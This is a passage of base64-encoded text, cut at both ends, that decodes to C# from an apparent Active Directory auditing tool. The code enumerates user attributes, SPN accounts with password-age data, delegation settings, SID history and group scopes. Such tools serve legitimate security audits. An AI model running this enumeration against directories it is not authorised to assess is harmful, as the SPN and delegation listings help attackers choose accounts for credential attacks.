lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTG9nb24gQWdlIChkYXlzKSIsIERheXNTaW5jZUxhc3RMb2dvbikpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJQYXNzd29yZCBBZ2UgKGRheXMpIiwgRGF5c1NpbmNlTGFzdFBhc3N3b3JkQ2hhbmdlKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRvcm1hbnQgKD4gIiArIERvcm1hbnRUaW1lU3BhbiArICIgZGF5cykiLCBEb3JtYW50KSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlBhc3N3b3JkIEFnZSAoPiAiICsgUGFzc01heEFnZSArICIgZGF5cykiLCBQYXNzd29yZE5vdENoYW5nZWRhZnRlck1heEFnZSkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJBY2NvdW50IExvY2tlZCBPdXQiLCBBY2NvdW50TG9ja2VkT3V0KSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlBhc3N3b3JkIEV4cGlyZWQiLCBQYXNzd29yZEV4cGlyZWQpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiUGFzc3dvcmQgTm90IFJlcXVpcmVkIiwgUGFzc3dvcmROb3RSZXF1aXJlZCkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEZWxlZ2F0aW9uIFR5cGUiLCBEZWxlZ2F0aW9uVHlwZSkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEZWxlZ2F0aW9uIFByb3RvY29sIiwgRGVsZWdhdGlvblByb3RvY29sKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRlbGVnYXRpb24gU2VydmljZXMiLCBEZWxlZ2F0aW9uU2VydmljZXMpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTG9nb24gV29ya3N0YXRpb25zIiwgKEFkVXNlci5Qcm9wZXJ0aWVzWyJ1c2Vyd29ya3N0YXRpb25zIl0uQ291bnQgIT0gMCA/IEFkVXNlci5Qcm9wZXJ0aWVzWyJ1c2Vyd29ya3N0YXRpb25zIl1bMF0gOiAiIikpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQWRtaW5Db3VudCIsIChBZFVzZXIuUHJvcGVydGllc1siYWRtaW5jb3VudCJdLkNvdW50ICE9IDAgPyBBZFVzZXIuUHJvcGVydGllc1siYWRtaW5jb3VudCJdWzBdIDogIiIpKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlByaW1hcnkgR3JvdXBJRCIsIChBZFVzZXIuUHJvcGVydGllc1sicHJpbWFyeWdyb3VwaWQiXS5Db3VudCAhPSAwID8gQWRVc2VyLlByb3BlcnRpZXNbInByaW1hcnlncm91cGlkIl1bMF0gOiAiIikpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiU0lEIiwgQ29udmVydC5Ub1N0cmluZyhuZXcgU2VjdXJpdHlJZGVudGlmaWVyKChieXRlW10pQWRVc2VyLlByb3BlcnRpZXNbIm9iamVjdFNJRCJdWzBdLCAwKSkpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiU0lESGlzdG9yeSIsIFNJREhpc3RvcnkpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiRGVzY3JpcHRpb24iLCAoQWRVc2VyLlByb3BlcnRpZXNbIkRlc2NyaXB0aW9uIl0uQ291bnQgIT0gMCA/IENsZWFuU3RyaW5nKEFkVXNlci5Qcm9wZXJ0aWVzWyJEZXNjcmlwdGlvbiJdWzBdKSA6ICIiKSkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJUaXRsZSIsIChBZFVzZXIuUHJvcGVydGllc1siVGl0bGUiXS5Db3VudCAhPSAwID8gQ2xlYW5TdHJpbmcoQWRVc2VyLlByb3BlcnRpZXNbIlRpdGxlIl1bMF0pIDogIiIpKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRlcGFydG1lbnQiLCAoQWRVc2VyLlByb3BlcnRpZXNbIkRlcGFydG1lbnQiXS5Db3VudCAhPSAwID8gQ2xlYW5TdHJpbmcoQWRVc2VyLlByb3BlcnRpZXNbIkRlcGFydG1lbnQiXVswXSkgOiAiIikpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQ29tcGFueSIsIChBZFVzZXIuUHJvcGVydGllc1siQ29tcGFueSJdLkNvdW50ICE9IDAgPyBDbGVhblN0cmluZyhBZFVzZXIuUHJvcGVydGllc1siQ29tcGFueSJdWzBdKSA6ICIiKSkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJNYW5hZ2VyIiwgKEFkVXNlci5Qcm9wZXJ0aWVzWyJNYW5hZ2VyIl0uQ291bnQgIT0gMCA/IENsZWFuU3RyaW5nKEFkVXNlci5Qcm9wZXJ0aWVzWyJNYW5hZ2VyIl1bMF0pIDogIiIpKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkluZm8iLCAoQWRVc2VyLlByb3BlcnRpZXNbImluZm8iXS5Db3VudCAhPSAwID8gQ2xlYW5TdHJpbmcoQWRVc2VyLlByb3BlcnRpZXNbImluZm8iXVswXSkgOiAiIikpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTGFzdCBMb2dvbiBEYXRlIiwgTGFzdExvZ29uRGF0ZSkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJQYXNzd29yZCBMYXN0U2V0IiwgUGFzc3dvcmRMYXN0U2V0KSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkFjY291bnQgRXhwaXJhdGlvbiBEYXRlIiwgQWNjb3VudEV4cGlyZXMpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQWNjb3VudCBFeHBpcmF0aW9uIChkYXlzKSIsIEFjY291bnRFeHBpcmF0aW9uTnVtb2ZEYXlzKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk1vYmlsZSIsIChBZFVzZXIuUHJvcGVydGllc1sibW9iaWxlIl0uQ291bnQgIT0gMCA/IENsZWFuU3RyaW5nKEFkVXNlci5Qcm9wZXJ0aWVzWyJtb2JpbGUiXVswXSkgOiAiIikpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiRW1haWwiLCAoQWRVc2VyLlByb3BlcnRpZXNbIm1haWwiXS5Db3VudCAhPSAwID8gQ2xlYW5TdHJpbmcoQWRVc2VyLlByb3BlcnRpZXNbIm1haWwiXVswXSkgOiAiIikpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiSG9tZURpcmVjdG9yeSIsIChBZFVzZXIuUHJvcGVydGllc1siaG9tZWRpcmVjdG9yeSJdLkNvdW50ICE9IDAgPyBBZFVzZXIuUHJvcGVydGllc1siaG9tZWRpcmVjdG9yeSJdWzBdIDogIiIpKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlByb2ZpbGVQYXRoIiwgKEFkVXNlci5Qcm9wZXJ0aWVzWyJwcm9maWxlcGF0aCJdLkNvdW50ICE9IDAgPyBBZFVzZXIuUHJvcGVydGllc1sicHJvZmlsZXBhdGgiXVswXSA6ICIiKSkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJTY3JpcHRQYXRoIiwgKEFkVXNlci5Qcm9wZXJ0aWVzWyJzY3JpcHRwYXRoIl0uQ291bnQgIT0gMCA/IEFkVXNlci5Qcm9wZXJ0aWVzWyJzY3JpcHRwYXRoIl1bMF0gOiAiIikpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiVXNlckFjY291bnRDb250cm9sIiwgKEFkVXNlci5Qcm9wZXJ0aWVzWyJ1c2VyYWNjb3VudGNvbnRyb2wiXS5Db3VudCAhPSAwID8gQWRVc2VyLlByb3BlcnRpZXNbInVzZXJhY2NvdW50Y29udHJvbCJdWzBdIDogIiIpKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkZpcnN0IE5hbWUiLCAoQWRVc2VyLlByb3BlcnRpZXNbImdpdmVuTmFtZSJdLkNvdW50ICE9IDAgPyBDbGVhblN0cmluZyhBZFVzZXIuUHJvcGVydGllc1siZ2l2ZW5OYW1lIl1bMF0pIDogIiIpKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk1pZGRsZSBOYW1lIiwgKEFkVXNlci5Qcm9wZXJ0aWVzWyJtaWRkbGVOYW1lIl0uQ291bnQgIT0gMCA/IENsZWFuU3RyaW5nKEFkVXNlci5Qcm9wZXJ0aWVzWyJtaWRkbGVOYW1lIl1bMF0pIDogIiIpKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkxhc3QgTmFtZSIsIChBZFVzZXIuUHJvcGVydGllc1sic24iXS5Db3VudCAhPSAwID8gQ2xlYW5TdHJpbmcoQWRVc2VyLlByb3BlcnRpZXNbInNuIl1bMF0pIDogIiIpKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkNvdW50cnkiLCAoQWRVc2VyLlByb3BlcnRpZXNbImMiXS5Db3VudCAhPSAwID8gQ2xlYW5TdHJpbmcoQWRVc2VyLlByb3BlcnRpZXNbImMiXVswXSkgOiAiIikpKTsKICAgICAgICAgICAgICAgICAgICBVc2VyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgid2hlbkNyZWF0ZWQiLCAoQWRVc2VyLlByb3BlcnRpZXNbIndoZW5jcmVhdGVkIl0uQ291bnQgIT0gMCA/IEFkVXNlci5Qcm9wZXJ0aWVzWyJ3aGVuY3JlYXRlZCJdWzBdIDogIiIpKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIndoZW5DaGFuZ2VkIiwgKEFkVXNlci5Qcm9wZXJ0aWVzWyJ3aGVuY2hhbmdlZCJdLkNvdW50ICE9IDAgPyBBZFVzZXIuUHJvcGVydGllc1sid2hlbmNoYW5nZWQiXVswXSA6ICIiKSkpOwogICAgICAgICAgICAgICAgICAgIFVzZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEaXN0aW5ndWlzaGVkTmFtZSIsIChBZFVzZXIuUHJvcGVydGllc1siZGlzdGluZ3Vpc2hlZG5hbWUiXS5Db3VudCAhPSAwID8gQ2xlYW5TdHJpbmcoQWRVc2VyLlByb3BlcnRpZXNbImRpc3Rpbmd1aXNoZWRuYW1lIl1bMF0pIDogIiIpKSk7CiAgICAgICAgICAgICAgICAgICAgVXNlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkNhbm9uaWNhbE5hbWUiLCAoQWRVc2VyLlByb3BlcnRpZXNbImNhbm9uaWNhbG5hbWUiXS5Db3VudCAhPSAwID8gQWRVc2VyLlByb3BlcnRpZXNbImNhbm9uaWNhbG5hbWUiXVswXSA6ICIiKSkpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IFVzZXJPYmogfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiezB9IEV4Y2VwdGlvbiBjYXVnaHQuIiwgZSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQU09iamVjdFtdIHsgfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgY2xhc3MgVXNlclNQTlJlY29yZFByb2Nlc3NvciA6IElSZWNvcmRQcm9jZXNzb3IKICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBQU09iamVjdFtdIHByb2Nlc3NSZWNvcmQoT2JqZWN0IHJlY29yZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU2VhcmNoUmVzdWx0IEFkVXNlciA9IChTZWFyY2hSZXN1bHQpIHJlY29yZDsKICAgICAgICAgICAgICAgICAgICBMaXN0PFBTT2JqZWN0PiBTUE5MaXN0ID0gbmV3IExpc3Q8UFNPYmplY3Q+KCk7CiAgICAgICAgICAgICAgICAgICAgYm9vbD8gRW5hYmxlZCA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIE1lbWJlcm9mID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBEYXRlVGltZT8gUGFzc3dvcmRMYXN0U2V0ID0gbnVsbDsKCiAgICAgICAgICAgICAgICAgICAgaWYgKEFkVXNlci5Qcm9wZXJ0aWVzWyJwd2RsYXN0c2V0Il0uQ291bnQgIT0gMCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChDb252ZXJ0LlRvU3RyaW5nKEFkVXNlci5Qcm9wZXJ0aWVzWyJwd2RsYXN0c2V0Il1bMF0pICE9ICIwIikKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFzc3dvcmRMYXN0U2V0ID0gRGF0ZVRpbWUuRnJvbUZpbGVUaW1lKChsb25nKShBZFVzZXIuUHJvcGVydGllc1sicHdkTGFzdFNldCJdWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgLy8gV2hlbiB0aGUgdXNlciBpcyBub3QgYWxsb3dlZCB0byBxdWVyeSB0aGUgVXNlckFjY291bnRDb250cm9sIGF0dHJpYnV0ZS4KICAgICAgICAgICAgICAgICAgICBpZiAoQWRVc2VyLlByb3BlcnRpZXNbInVzZXJhY2NvdW50Y29udHJvbCJdLkNvdW50ICE9IDApCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgdXNlckZsYWdzID0gKFVBQ0ZsYWdzKSBBZFVzZXIuUHJvcGVydGllc1sidXNlcmFjY291bnRjb250cm9sIl1bMF07CiAgICAgICAgICAgICAgICAgICAgICAgIEVuYWJsZWQgPSAhKCh1c2VyRmxhZ3MgJiBVQUNGbGFncy5BQ0NPVU5URElTQUJMRSkgPT0gVUFDRmxhZ3MuQUNDT1VOVERJU0FCTEUpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBTdHJpbmcgRGVzY3JpcHRpb24gPSAoQWRVc2VyLlByb3BlcnRpZXNbIkRlc2NyaXB0aW9uIl0uQ291bnQgIT0gMCA/IENsZWFuU3RyaW5nKEFkVXNlci5Qcm9wZXJ0aWVzWyJEZXNjcmlwdGlvbiJdWzBdKSA6ICIiKTsKICAgICAgICAgICAgICAgICAgICBTdHJpbmcgUHJpbWFyeUdyb3VwSUQgPSAoQWRVc2VyLlByb3BlcnRpZXNbInByaW1hcnlncm91cGlkIl0uQ291bnQgIT0gMCA/IENvbnZlcnQuVG9TdHJpbmcoQWRVc2VyLlByb3BlcnRpZXNbInByaW1hcnlncm91cGlkIl1bMF0pIDogIiIpOwogICAgICAgICAgICAgICAgICAgIGlmIChBZFVzZXIuUHJvcGVydGllc1sibWVtYmVyb2YiXS5Db3VudCAhPSAwKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoU3RyaW5nIE1lbWJlciBpbiBBZFVzZXIuUHJvcGVydGllc1sibWVtYmVyb2YiXSkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgTWVtYmVyb2YgPSBNZW1iZXJvZiArICIsIiArICgoQ29udmVydC5Ub1N0cmluZyhNZW1iZXIpKS5TcGxpdCgnLCcpWzBdKS5TcGxpdCgnPScpWzFdOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIE1lbWJlcm9mID0gTWVtYmVyb2YuVHJpbVN0YXJ0KCcsJyk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKFN0cmluZyBTUE4gaW4gQWRVc2VyLlByb3BlcnRpZXNbInNlcnZpY2VwcmluY2lwYWxuYW1lIl0pCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBTdHJpbmdbXSBTUE5BcnJheSA9IFNQTi5TcGxpdCgnLycpOwogICAgICAgICAgICAgICAgICAgICAgICBQU09iamVjdCBVc2VyU1BOT2JqID0gbmV3IFBTT2JqZWN0KCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFVzZXJTUE5PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJOYW1lIiwgQWRVc2VyLlByb3BlcnRpZXNbIm5hbWUiXVswXSkpOwogICAgICAgICAgICAgICAgICAgICAgICBVc2VyU1BOT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiVXNlcm5hbWUiLCBBZFVzZXIuUHJvcGVydGllc1sic2FtYWNjb3VudG5hbWUiXVswXSkpOwogICAgICAgICAgICAgICAgICAgICAgICBVc2VyU1BOT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiRW5hYmxlZCIsIEVuYWJsZWQpKTsKICAgICAgICAgICAgICAgICAgICAgICAgVXNlclNQTk9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNlcnZpY2UiLCBTUE5BcnJheVswXSkpOwogICAgICAgICAgICAgICAgICAgICAgICBVc2VyU1BOT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiSG9zdCIsIFNQTkFycmF5WzFdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFVzZXJTUE5PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJQYXNzd29yZCBMYXN0IFNldCIsIFBhc3N3b3JkTGFzdFNldCkpOwogICAgICAgICAgICAgICAgICAgICAgICBVc2VyU1BOT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiRGVzY3JpcHRpb24iLCBEZXNjcmlwdGlvbikpOwogICAgICAgICAgICAgICAgICAgICAgICBVc2VyU1BOT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiUHJpbWFyeSBHcm91cElEIiwgUHJpbWFyeUdyb3VwSUQpKTsKICAgICAgICAgICAgICAgICAgICAgICAgVXNlclNQTk9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk1lbWJlcm9mIiwgTWVtYmVyb2YpKTsKICAgICAgICAgICAgICAgICAgICAgICAgU1BOTGlzdC5BZGQoIFVzZXJTUE5PYmogKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFNQTkxpc3QuVG9BcnJheSgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJ7MH0gRXhjZXB0aW9uIGNhdWdodC4iLCBlKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFBTT2JqZWN0W10geyB9OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBjbGFzcyBHcm91cFJlY29yZFByb2Nlc3NvciA6IElSZWNvcmRQcm9jZXNzb3IKICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBQU09iamVjdFtdIHByb2Nlc3NSZWNvcmQoT2JqZWN0IHJlY29yZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU2VhcmNoUmVzdWx0IEFkR3JvdXAgPSAoU2VhcmNoUmVzdWx0KSByZWNvcmQ7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIE1hbmFnZWRCeVZhbHVlID0gQWRHcm91cC5Qcm9wZXJ0aWVzWyJtYW5hZ2VkYnkiXS5Db3VudCAhPSAwID8gQ29udmVydC5Ub1N0cmluZyhBZEdyb3VwLlByb3BlcnRpZXNbIm1hbmFnZWRieSJdWzBdKSA6ICIiOwogICAgICAgICAgICAgICAgICAgIFN0cmluZyBNYW5hZ2VkQnkgPSAiIjsKICAgICAgICAgICAgICAgICAgICBTdHJpbmcgR3JvdXBDYXRlZ29yeSA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIEdyb3VwU2NvcGUgPSBudWxsOwogICAgICAgICAgICAgICAgICAgIFN0cmluZyBTSURIaXN0b3J5ID0gIiI7CgogICAgICAgICAgICAgICAgICAgIGlmIChBZEdyb3VwLlByb3BlcnRpZXNbIm1hbmFnZWRCeSJdLkNvdW50ICE9IDApCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBNYW5hZ2VkQnkgPSAoTWFuYWdlZEJ5VmFsdWUuU3BsaXQoJywnKVswXSkuU3BsaXQoJz0nKVsxXTsKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIGlmIChBZEdyb3VwLlByb3BlcnRpZXNbImdyb3VwdHlwZSJdLkNvdW50ICE9IDApCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgZ3JvdXBUeXBlRmxhZ3MgPSAoR3JvdXBUeXBlRmxhZ3MpIEFkR3JvdXAuUHJvcGVydGllc1siZ3JvdXB0eXBlIl1bMF07CiAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwQ2F0ZWdvcnkgPSAoZ3JvdXBUeXBlRmxhZ3MgJiBHcm91cFR5cGVGbGFncy5TRUNVUklUWV9FTkFCTEVEKSA9PSBHcm91cFR5cGVGbGFncy5TRUNVUklUWV9FTkFCTEVEID8gIlNlY3VyaXR5IiA6ICJEaXN0cmlidXRpb24iOwoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKChncm91cFR5cGVGbGFncyAmIEdyb3VwVHlwZUZsYWdzLlVOSVZFUlNBTF9HUk9VUCkgPT0gR3JvdXBUeXBlRmxhZ3MuVU5JVkVSU0FMX0dST1VQKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cFNjb3BlID0gIlVuaXZlcnNhbCI7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAoKGdyb3VwVHlwZUZsYWdzICYgR3JvdXBUeXBlRmxhZ3MuR0xPQkFMX0dST1VQKSA9PSBHcm91cFR5cGVGbGFncy5HTE9CQUxfR1JPVVApCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwU2NvcGUgPSAiR2xvYmFsIjsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIGlmICgoZ3JvdXBUeXBlRmxhZ3MgJiBHcm91cFR5cGVGbGFncy5ET01BSU5fTE9DQUxfR1JPVVApID09IEdyb3VwVHlwZUZsYWdzLkRPTUFJTl9MT0NBTF9HUk9VUCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBTY29wZSA9ICJEb21haW5Mb2NhbCI7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKEFkR3JvdXAuUHJvcGVydGllc1sic2lkaGlzdG9yeSJdLkNvdW50ID49IDEpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgc2lkcyA9ICIiOwogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IEFkR3JvdXAuUHJvcGVydGllc1sic2lkaGlzdG9yeSJdLkNvdW50OyBpKyspCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBoaXN0b3J5ID0gQWRHcm91cC5Qcm9wZXJ0aWVzWyJzaWRoaXN0b3J5Il1baV07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaWRzID0gc2lkcyArICIsIiArIENvbnZlcnQuVG9TdHJpbmcobmV3IFNlY3VyaXR5SWRlbnRpZmllcigoYnl0ZVtdKWhpc3RvcnksIDApKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBTSURIaXN0b3J5ID0gc2lkcy5UcmltU3RhcnQoJywnKTsKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIFBTT2JqZWN0IEdyb3VwT2JqID0gbmV3IFBTT2JqZWN0KCk7CiAgICAgICAgICAgICAgICAgICAgR3JvdXBPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJOYW1lIiwgQWRHcm91cC5Qcm9wZXJ0aWVzWyJzYW1hY2NvdW50bmFtZSJdWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgR3JvdXBPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJBZG1pbkNvdW50IiwgKEFkR3JvdXAuUHJvcGVydGllc1siYWRtaW5jb3VudCJdLkNvdW50ICE9IDAgPyBBZEdyb3VwLlByb3BlcnRpZXNbImFkbWluY291bnQiXVswXSA6ICIiKSkpOwogICAgICAgICAgICAgICAgICAgIEdyb3VwT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiR3JvdXBDYXRlZ29yeSIsIEdyb3VwQ2F0ZWdvcnkpKTsKICAgICAgICAgICAgICAgICAgICBHcm91cE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkdyb3VwU2NvcGUiLCBHcm91cFNjb3BlKSk7CiAgICAgICAgICAgICAgICAgICAgR3JvdXBPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJNYW5hZ2VkQnkiLCBNYW5hZ2VkQnkpKTsKICAgICAgICAgICAgICAgICAgICBHcm91cE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNJRCIsIENvbnZlcnQuVG9TdHJpbmcobmV3IFNlY3VyaXR5SWRlbnRpZmllcigoYnl0ZVtdKUFkR3JvdXAuUHJvcGVydGllc1sib2JqZWN0U0lEIl1bMF0sIDApKSkpOwogICAgICAgICAgICAgICAgICAgIEdyb3VwT2JqLk1lbWJlcnMuQWRkK